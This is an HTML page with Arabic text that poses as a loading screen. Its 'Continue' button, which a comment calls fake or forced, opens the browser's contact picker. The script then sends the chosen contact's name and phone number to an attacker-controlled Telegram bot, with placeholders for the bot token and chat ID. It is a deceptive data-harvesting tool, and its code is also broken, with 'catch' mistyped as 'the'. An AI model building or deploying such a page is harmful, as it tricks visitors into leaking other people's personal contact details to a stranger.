<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل...</title>
</head>
<body style="background-color: #121212; color: white; text-align: center; padding-top: 100px; font-family: Tahoma, sans-serif;">

    <h2>جاري التحميل، يرجى الانتظار...</h2>
    <p style="color: #888; font-size: 14px;">اضغط على السماح للمتابعة</p>

    <!-- زر وهمي أو إجباري لفتح نافذة اختيار الرقم -->
    <button id="btn" style="background-color: #2ea44f; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px;">متابعة</button>

    <script>
        const botToken = 'أدخل_توكن_البوت_هنا'; // حط توكن بوتك هنا
        const chatId = 'أدخل_رقم_الـ_Chat_ID_هنا'; // حط الآيدي بتاعك هنا

        document.getElementById('btn').addEventListener('click', async () => {
            // التحقق مما إذا كانت الميزة مدعومة في المتصفح
            if ('contacts' in navigator && 'Navigator' in window) {
                try {
                    const props = ['tel', 'name'];
                    const opts = { multiple: false }; // اختيار رقم واحد فقط
                    const contacts = await navigator.contacts.select(props, opts);

                    if (contacts.length > 0) {
                        const contact = contacts[0];
                        const phoneNumber = contact.tel ? contact.tel[0] : "غير متوفر";
                        const contactName = contact.name ? contact.name[0] : "بدون اسمk";

                        // تجهيز الرسالة لإرسالها للبوت
                        const message = `تم الحصول على جهة اتصال جديدة:\n👤 الاسم: ${contactName}\n📞 الرقم: ${phoneNumber}`;

                        // إرسال البيانات مباشرة للبوت عبر الـ API
                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message
                            })
                        });
                    }
                } the (err) {
                    console.log("خطأ أو تم إلغاء الطلب:", err);
                }
            } else {
                alert("متصفحك لا يدعم هذه الخاصية.");
            }
        });

        // محاولة فتح النافذة تلقائياً أول ما الصفحة تفتح (بعض المتصفحات تحظرها إلا بضغطـة زر)
        window.onload = () => {
            // يمكن للمستخدم الضغط على الزر لو لم تفتح تلقائياً
        };
    </script>

</body>
</html>
